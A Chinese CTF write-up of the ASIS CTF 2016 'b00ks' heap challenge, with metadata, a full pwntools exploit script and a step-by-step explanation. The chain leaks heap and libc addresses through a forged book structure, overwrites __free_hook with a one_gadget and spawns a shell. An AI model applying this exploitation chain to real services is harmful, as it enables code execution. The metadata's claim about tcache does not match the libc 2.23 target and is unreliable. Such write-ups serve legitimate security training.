---
title: 漏洞学习之 PWN ASIS_CTF_2016_b00ks
contest: ASISCTF
year: 2016
difficulty: medium
vuln_type: pwn_unknown
tags: [book-management, fake-book, libc-leak, mmap, Edit, Change, Print, one_gadget, ASIS, classic-heap]
attack_chain:
  - 菜单: 1=Create / 2=Delete / 3=Edit / 4=Print / 5=Change name
  - Step 1: Change name 0x20 字节 + Create book1 (0xd0) + book2 (0x21000, mmap)
  - Step 2: Print 泄 book1_addr (在 name 后)
  - Step 3: Edit book1 写 fake_book: p64(1) + p64(book2+8) * 2 + p64(0x20)
  - Step 4: Change name 0x20 重新触发 Print → 泄 libc (book2 内容 mmap 指针指向 libc)
  - libc_base = leak - 0x5b0010
  - Step 5: Edit 改 free_hook = one_gadget 0x4527a
  - Step 6: Delete 触发 one_gadget
key_payload: 'Edit fake_book + Change name 触发 Print + free_hook = one_gadget 0x4527a + Delete 触发'
one_liner: ASIS CTF 2016 b00ks：Edit 写 fake book 结构 + Change name 触发 Print 泄 mmap 指针指向 libc，改 free_hook 拿 shell。
lesson: Print 触发条件依赖 name 字段是 b00ks 经典套路；mmap 大块堆布局可绕过 tcache 限制。
quality: high
---

# 漏洞学习之 PWN ASIS_CTF_2016_b00ks

**来源**: ctfiot.com ID 89361

## 题目
- 菜单: 1=Create / 2=Delete / 3=Edit / 4=Print / 5=Change name
- book 结构: name (size) + description (size)
- 经典 ASIS 2016 b00ks 漏洞

## 漏洞利用

```python
from pwn import *
from LibcSearcher import *

debug = 1
if (debug):
    p = process("./ASIS_CTF_2016_b00ks")
else:
    p = remote('node4.buuoj.cn', 27816)

elf = ELF('ASIS_CTF_2016_b00ks')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def Create(nsize, name, dsize, desc):
    p.sendlineafter("> ", '1')
    p.sendlineafter("name size: ", str(nsize))
    p.sendlineafter("name (Max 32 chars): ", name)
    p.sendlineafter("description size: ", str(dsize))
    p.sendlineafter("description: ", desc)

def Delete(idx):
    p.sendlineafter("> ", '2')
    p.sendlineafter("delete: ", str(idx))

def Edit(idx, desc):
    p.sendlineafter("> ", '3')
    p.sendlineafter("edit: ", str(idx))
    p.sendlineafter("description: ", desc)

def Print():
    p.sendlineafter("> ", '4')

def Change(name):
    p.sendlineafter("> ", '5')
    p.sendlineafter("name: ", name)

# Step 1: leak heap
p.sendlineafter("name: ", b'A' * 0x20)
Create(0xd0, "AAAA", 0x20, "AAAA")   # book1
Create(0x21000, "BBBB", 0x21000, "BBBB")   # book2 (mmap)

Print()
p.recvuntil("A" * 0x20)
book1_addr = u64(p.recvn(6) + b'\x00' + b'\x00')
log.info("book1_addr: " + hex(book1_addr))
book2_addr = book1_addr + 0x30
log.info("book2 address: 0x%x" % book2_addr)

# Step 2: Edit book1 → fake book, then Change name 触发 Print
fake_book = p64(1) + p64(book2_addr + 0x8) * 2 + p64(0x20)
Edit(1, fake_book)
Change("A" * 0x20)
Print()

# Step 3: leak libc
p.recvuntil("Name: ")
leak_addr = u64(p.recvn(6) + b'\x00' + b'\x00')
libc_base = leak_addr - 0x5b0010   # mmap_addr - libc_base
log.info("libc address: 0x%x" % libc_base)

one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]

# Step 4: free_hook = one_gadget
free_hook = libc.symbols['__free_hook'] + libc_base
one_gadget = libc_base + one_gadget[1]

fake_book = p64(free_hook) * 2
Edit(1, fake_book)
fake_book = p64(one_gadget)
Edit(2, fake_book)

# Step 5: 触发
Delete(2)
p.interactive()
```

## 攻击链详解

### Step 1: heap 地址泄漏
- Change name 写入 0x20 'A' 填充 name buffer
- Create book1 (0xd0) 和 book2 (0x21000, 触发 mmap)
- Print 触发，泄漏 book1 结构地址

### Step 2: 改 book1 为 fake book
- Edit(1, fake_book) 改写 book1 description
- fake_book = `p64(1) + p64(book2+8)*2 + p64(0x20)`
- 让 Print 跳到 book2 内容

### Step 3: 泄 libc
- Change name 再触发 Print
- 这次 Print 走到 book2 内容，里面有 mmap 返回地址
- mmap 区域与 libc 有固定偏移
- libc_base = leak - 0x5b0010

### Step 4: 改 free_hook
- one_gadget = 0x4527a
- Edit(1) 把 free_hook 写到 book1 描述
- Edit(2) 把 one_gadget 写到 free_hook 位置

### Step 5: 触发
- Delete(2) → free 触发 free_hook → one_gadget → shell

## 评价
ASIS CTF 2016 经典 PWN 题，b00ks 是 2016 年最具影响力的堆利用题：
- 菜单 PWN 标准模板
- 经典 fake book 篡改 Print 路径
- mmap + heap 双区域布局
- one_gadget 触发 free_hook

至今仍是堆 PWN 必学案例。
